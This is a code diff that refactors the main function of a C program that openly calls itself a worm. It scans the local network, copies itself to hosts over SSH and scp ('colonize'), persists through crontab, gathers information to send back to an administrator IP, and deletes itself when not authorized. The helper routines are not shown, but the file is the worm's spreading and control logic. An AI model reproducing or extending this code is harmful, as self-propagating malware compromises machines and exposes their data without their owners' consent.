@@ -1,67 +1,53 @@
 #include "../include/main.h"
 
-int main (int argc, char **argv) {
-	int ret = EXIT_FAILURE;
-	int portSSH, cpt;
-	char programPath[PATH_MAX];
-	dictionary *dico;
-	struct in_addr adminHost;
-	char *programName, *adminIP, *command, *control, *dstPath, *crontab, *scpPath, *sshPath, *broadcast;
-	struct in_addr *hostList = NULL;
+int main(int argc, char **argv) 
+{
+	char *worm_name, *admin_ip;
+	struct in_addr *hosts_list;
+	struct in_addr admin_host;
+	int cpt = 0;
+	int ret = EXIT_FAILURE;	
 
-	// get real path of the program
-	realpath(argv[0], programPath);
+	// get the worm name
+	worm_name = basename(argv[0]);
 
-	// get the program name
-	programName = basename(argv[0]);
-
-	// go into the program directory
+	// enter into the worm directory
 	chdir(dirname(argv[0]));
 
-	// read and check the configuration file
-	dico = GetConfig();
-	adminIP = iniparser_getstring(dico, "Administrator:ip", NULL);
-	command = iniparser_getstring(dico, "Administrator:command", NULL);
-	control = iniparser_getstring(dico, "Target:control", NULL);
-	dstPath = iniparser_getstring(dico, "Target:targetPath", NULL);
-	crontab = iniparser_getstring(dico, "Target:crontab", NULL);
-	scpPath = iniparser_getstring(dico, "Network:scp", NULL);
-	sshPath = iniparser_getstring(dico, "Network:ssh", NULL);
-	portSSH = iniparser_getint(dico, "Network:portSSH", -1);
-	broadcast = iniparser_getstring(dico, "Network:broadcast", NULL);
+	// read the configuration file
+	readConfig();
 
-	// if the user is root
+	// get the administrator ip address
+	admin_ip = iniparser_getstring(params, "Administrator:ip", NULL);
+
+	// if the program is launched by root
 	if (isRoot()) {
 		// if the host is the administrator
-		if(isSourceHost(adminIP)) {
-			hostList = scanNetwork(adminIP, broadcast, portSSH);
-			inet_aton(adminIP, &adminHost);
-			cpt = 0;
-			while (1) {
+		if (isSourceHost()) {
+			hosts_list = scanNetwork();
+			inet_aton(admin_ip, &admin_host);
+			while (true) {
 				// if the target host and the administrator host are in the same subnet
-				if (inet_netof(hostList[cpt]) == inet_netof(adminHost)) {
-					// if the host is not colonized
-					if (!isAlreadyColonized(inet_ntoa(hostList[cpt]), programName, sshPath, portSSH, dstPath)) {
-						// colonize the host
-						colonize(inet_ntoa(hostList[cpt]), sshPath, portSSH, scpPath, programPath, dstPath, crontab);
-					}
+				if (inet_netof(hosts_list[cpt]) == inet_netof(admin_host)) {
+					// if the host is not already colonized
+					if (!isAlreadyColonized(inet_ntoa(hosts_list[cpt]), worm_name))
+						colonize(inet_ntoa(hosts_list[cpt]), worm_name);
+					cpt++;
 				}
 				else
 					break;
-				cpt++;
 			}
 		}
 		else {
-			// if the host is authorized
-			if (isAuthorized(control))
-				informationsRecovery(command, dstPath, control, adminIP, scpPath, portSSH);
+			// if the worm is authorized to be executed
+			if (isAuthorized())
+				infosRecovery();
 			else
-				// delete program, configuration file and restore crontab
-				wormDelete(programName, dstPath, crontab);
+				wormDelete(worm_name);
 		}
-		ret = EXIT_SUCCESS;	
+		ret = EXIT_SUCCESS;
 	}
-	iniparser_freedict(dico);
+	iniparser_freedict(params);
 
 	return ret;
 }
